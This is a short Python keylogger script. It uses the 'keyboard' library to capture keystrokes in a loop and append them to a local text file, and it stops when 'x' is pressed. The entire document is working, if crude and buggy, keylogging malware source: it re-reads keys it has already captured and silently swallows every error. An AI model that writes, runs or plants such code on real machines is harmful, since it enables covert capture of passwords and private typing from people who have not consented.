import keyboard

def keylogging():
    try:
        while True:
            keystrokes=keyboard.read_key()
            with open('keystrokes.txt','a+') as fh:
                if (keystrokes=='space') or(keystrokes=='right space') or (keystrokes=='enter')  or (keystrokes=='backspace')  or (keystrokes=='shift') or (keystrokes=='alt'):
                    fh.write('\n' + str(keyboard.read_key()) + '\n')
                elif (keystrokes=='left') or (keystrokes=='right') or (keystrokes=='up') or (keystrokes=='down') or (keystrokes=='enter')or (keystrokes=='caps lock'):
                    fh.write('\n' + str(keyboard.read_key()) + '\n')
                elif (keystrokes=='ctrl'):
                    pass
                elif keystrokes=='x':
                    break
                else:
                    fh.write(keyboard.read_key())
    except:
        pass




if __name__=='__main__':
    keylogging()